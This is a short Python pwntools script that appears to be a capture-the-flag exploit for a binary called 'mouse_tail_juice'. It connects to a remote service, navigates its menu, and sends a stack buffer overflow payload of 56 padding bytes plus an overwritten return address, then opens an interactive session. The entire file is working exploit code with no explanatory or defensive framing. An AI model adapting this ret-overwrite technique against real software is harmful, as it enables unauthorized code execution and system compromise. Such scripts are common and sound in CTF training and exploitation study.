#-*- coding:utf-8 –*-
from pwn import *
context.log_level='debug'

Debug = 1

if Debug:
	io = remote("192.168.206.100", 10280)
else:
	io = process("./mouse_tail_juice")

elf = ELF('./mouse_tail_juice')

# gdb.attach(io)
io.recvuntil(': ')
io.sendline("1")
io.recvuntil('3\n')
io.recvuntil('3\n')
io.recvuntil('\n')
io.sendline("1")

payload = 56*'a' + p64(0x400e36)

io.sendline(payload)
print io.recv()

io.interactive()
